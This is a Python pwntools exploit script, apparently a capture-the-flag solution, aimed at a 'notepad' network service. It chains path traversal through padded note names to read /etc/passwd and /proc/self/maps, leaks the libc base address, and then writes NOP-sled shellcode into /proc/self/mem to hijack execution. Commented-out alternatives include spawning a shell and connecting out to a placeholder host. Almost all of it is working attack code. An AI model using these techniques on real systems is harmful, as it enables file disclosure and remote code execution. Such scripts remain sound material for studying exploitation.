# %%

import hashlib
import sys

from pwn import *

# %%

# conn = process(['./src/release/share/notepad'])

# ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5e8e1b0192a5a10e4f587b9ea8e0e5b8472a5603, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# %%


def get_port():

    def pow_solver(prefix: str, difficulty):
        zeros = '0' * difficulty

        def is_valid(digest):
            if sys.version_info.major == 2:
                digest = [ord(i) for i in digest]
            bits = ''.join(bin(i)[2:].zfill(8) for i in digest)
            return bits[:difficulty] == zeros

        i = 0
        while True:
            i += 1
            s = prefix + str(i)
            if is_valid(hashlib.sha256(s.encode()).digest()):
                return i

    _conn = remote('10.113.184.121', 10044)

    _conn.recvuntil(b'sha256(')
    a = _conn.recvline().strip()

    a = a.split(b')')
    prefix = str(a[0].split(b' ')[0].decode())
    difficulty = int(a[1].split(b'(')[1].decode())

    print(f"{prefix = }")
    print(f"{difficulty = }")

    _pow = pow_solver(prefix, difficulty)

    print(f"{_pow = }")

    _conn.sendlineafter(b'Answer: ', str(_pow).encode())

    _conn.recvuntil(b'on port ')
    a = _conn.recvline().strip()
    _conn.close()

    port = int(a.split(b'.')[0].decode())

    print(f"{port = }")
    print()

    return port


class NotepadWorker():

    conn: remote

    def __init__(self, port):
        self.conn = remote('10.113.184.121', port)
        return

    def _menu(self):
        res = self.conn.recvuntil(b'> ')
        return res

    def _res(self):
        _mes = b'+==========      Notepad       ==========+'
        res = self.conn.recvuntil(_mes, drop=True)
        return res

    def login(self, username, password):
        print("\nlogin")

        self._menu()
        self.conn.sendline(b'1')

        self.conn.recvuntil(b'Username: ')
        self.conn.send(str(username).encode())

        self.conn.recvuntil(b'Password: ')
        self.conn.send(str(password).encode())

        _res = self._res()

        if b'Success' not in _res:
            print("Login Failed!")
        else:
            print("Login Success!")

        return _res

    def register(self, username, password):
        print("\nregister")

        self._menu()
        self.conn.sendline(b'2')

        self.conn.recvuntil(b'Username: ')
        self.conn.send(str(username).encode())

        self.conn.recvuntil(b'Password: ')
        self.conn.send(str(password).encode())

        _res = self._res()

        if b'Success' not in _res:
            print("Register Failed!")
        else:
            print("Register Success!")

        return _res

    def new_note(self, note_name: bytes, content: bytes):
        print("\nnew_note")
        print(f"{note_name = }")
        print(f"{content = }")

        self._menu()
        self.conn.sendline(b'3')

        self.conn.recvuntil(b'Note Name: ')
        self.conn.send(note_name)

        clen = len(content) + 1

        self.conn.recvuntil(b'Content Length: ')
        self.conn.sendline(str(clen).encode())

        self.conn.recvuntil(b'Content: ')
        self.conn.sendline(content)

        _res = self._res()
        print(_res.decode())

        if b'Note created!' not in _res:
            print("New Note Failed!")
            return None
        else:
            print("New Note Success!")

        return _res

    def edit_note(self, note_name: bytes, offset: int, content: bytes):
        print("\nedit_note")
        print(f"{note_name = }")
        print(f"{offset = }")
        print(f"{content = }")

        self._menu()
        self.conn.sendline(b'4')

        self.conn.recvuntil(b'Note Name: ')
        self.conn.send(note_name)

        self.conn.recvuntil(b'Offset: ')
        self.conn.sendline(str(offset).encode())

        clen = len(content) + 1

        self.conn.recvuntil(b'Content Length: ')
        self.conn.sendline(str(clen).encode())

        self.conn.recvuntil(b'Content: ')
        self.conn.sendline(content)

        _res = self._res()
        print(_res.decode())

        if b'Couldn\'t open the file.' in _res:
            print("Edit Note Failed!")
            return None
        else:
            print("Edit Note Success!")

        return _res

    def show_note(self, note_name: bytes, offset: int):
        print("\nshow_note")
        print(f"{note_name = }")
        print(f"{offset = }")

        self._menu()
        self.conn.sendline(b'5')

        self.conn.recvuntil(b'Note Name: ')
        self.conn.send(note_name)

        self.conn.recvuntil(b'Offset: ')
        self.conn.sendline(str(offset).encode())

        _res = self._res()
        # print(_res.decode())

        if ((b'Couldn\'t open the file.' in _res)
                or (b'Read note failed.' in _res)):
            print("Show Note Failed!")
            return None
        else:
            print("Show Note Success!")

        return _res

    def interactive(self):
        self.conn.interactive()
        return


# %%


def subfolder_num(nw: NotepadWorker):
    know_file = b'/etc/passwd'
    offset = 0

    max_len = 256
    is_done = False

    fin_i, fin_j = -1, -1

    for i in range(max_len // 3 + 1):
        if is_done:
            break

        _len = len(know_file) + i * 3
        for j in range(max_len - _len + 1):
            if is_done:
                break

            note_name = b'/' + b'/' * j + b'/..' * i + know_file
            _res = nw.show_note(note_name, offset)

            if _res is not None:
                is_done = True
                fin_i = i
                fin_j = j

    fin_note_name = b'/' + b'/' * fin_j + b'/..' * fin_i + know_file

    # print(len(fin_note_name))
    # print(fin_i)
    # print(fin_j)
    # # 107
    # # 3
    # # 86
    return


def notefile_pad_name(note_name: bytes, i=3, padlen=107):
    # if note_name[0] != b'/':
    #     note_name = b'/' + note_name

    note_name = b'/..' * i + note_name

    if len(note_name) > padlen:
        print("CAN NOT READ FILE EXECEED PADDING LEN.")

    _len = len(note_name)
    note_name = b'/' * (padlen - _len) + note_name
    return note_name


def get_complete_note(nw: NotepadWorker, notename: bytes):
    notename = notefile_pad_name(notename)

    note = b''

    for i in range(100):
        _offset = 128 * i

        _res = nw.show_note(notename, _offset)
        if _res is not None:
            note += _res
        else:
            break

    return note


# %%

context.arch = "amd64"
context.os == "linux"

_port = get_port()
# _port = 20774

notepad_worker = NotepadWorker(_port)

notepad_worker.register(1, 1)
notepad_worker.login(1, 1)

# %%

_name = b'/proc/self/maps'
a = get_complete_note(notepad_worker, _name)
print(a)
print()
print(a.decode())

proc_maps = a.decode().split('\n')
start_addr = None
heap_addr = None

for mmap in proc_maps:
    # 7f6a6f623000-7f6a6f7b8000 r-xp 00028000 08:01 22554614                   /usr/lib/x86_64-linux-gnu/libc.so.6
    if 'r-xp' in mmap and '/usr/lib/x86_64-linux-gnu/libc.so.6' in mmap:
        start_addr = int(mmap.split('-')[0], 16)
    # 55ed8924a000-55ed8926b000 rw-p 00000000 00:00 0                          [heap]
    if 'rw-p' in mmap and '[heap]' in mmap:
        heap_addr = int(mmap.split('-')[0], 16)

print("libc base")
print(f"{hex(start_addr) = }")
print()

# %%

# hex(addr) = '0x1142f0'
# hex(addr) = '0x114d60'
# hex(addr) = '0x1145e0'
# hex(addr) = '0x114680'
# hex(addr) = '0xa96d0'

# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# addr = libc.symbols['open']
# print(f'{hex(addr) = }')
# addr = libc.symbols['close']
# print(f'{hex(addr) = }')
# addr = libc.symbols['read']
# print(f'{hex(addr) = }')
# addr = libc.symbols['write']
# print(f'{hex(addr) = }')
# addr = libc.symbols['memset']
# print(f'{hex(addr) = }')

cmd_len = 4 + 32 + 128
res_len = 4 + 256

# start_addr += 0x114500

cmd_payload = b'\x87\x87'.ljust(cmd_len, b'\x00')
res_payload = b'\x00'.ljust(res_len, b'\x00')

payload = shellcraft.socket()
payload += shellcraft.connect('127.0.0.1', 8765)
payload += shellcraft.mov('rcx', 'rbp')
payload += shellcraft.pushstr(cmd_payload)
payload += shellcraft.write('rcx', 'rsp', cmd_len)
# payload += shellcraft.pushstr(res_payload)
payload += shellcraft.read('rcx', 'rsp', res_len)
payload += shellcraft.write(1, 'rsp', res_len)

#######################
# payload = shellcraft.socket()
# payload += shellcraft.connect('127.0.0.1', 8765)
# payload += shellcraft.mov('rcx', 'rbp')
# payload += shellcraft.pushstr(cmd_payload)
# payload += shellcraft.write('rcx', 'rsp', cmd_len)
# # payload += shellcraft.pushstr(res_payload)
# payload += shellcraft.read('rcx', 'rsp', res_len)
# payload += shellcraft.write(1, 'rsp', res_len)

#######################
# payload = shellcraft.pushstr(cmd_payload)
# payload += shellcraft.write(0, 'rsp', cmd_len)

#######################
# payload = shellcraft.amd64.pushstr("/etc/passwd\x00")
# payload += shellcraft.amd64.open('rsp', 0, 0)

#######################
# payload = shellcraft.open("/etc/passwd\x00")
# payload += shellcraft.read('rax', 'rsp', 0x100)
# payload += shellcraft.amd64.write(1, 'rsp', 0x100)

#######################
# payload += shellcraft.read(0, 'rbx', 0x100)
# payload += shellcraft.write(1, 'rbx', 0x100)

#######################
# payload = shellcraft.amd64.linux.cat("/flag_backend")

#######################
# payload = pwnlib.shellcraft.amd64.linux.execve()

#######################
# payload = pwnlib.shellcraft.amd64.linux.socket()
# payload += shellcraft.amd64.linux.connect('${ip}', 80)

#######################
# payload = """
# dec eax
# mov eax, 0xfafafafa
# ud2
# cli
# hlt
# """
# payload = shellcraft.sh()

#######################

print(payload)
print(asm(payload))
print(disasm(asm(payload)))

_len = 1024 - len(asm(payload)) - 1
asm_payload = asm("nop") * _len + asm(payload)
print(f"{asm_payload = }")

# start_addr += 1024

print("INPUT> ")
raw_input()

_name = b'/proc/self/mem'
notename = notefile_pad_name(_name)
notepad_worker.edit_note(notename, start_addr, asm_payload)

_name = b'/flag_user'
notename = notefile_pad_name(_name)
print(notename)

notepad_worker.interactive()

# %%
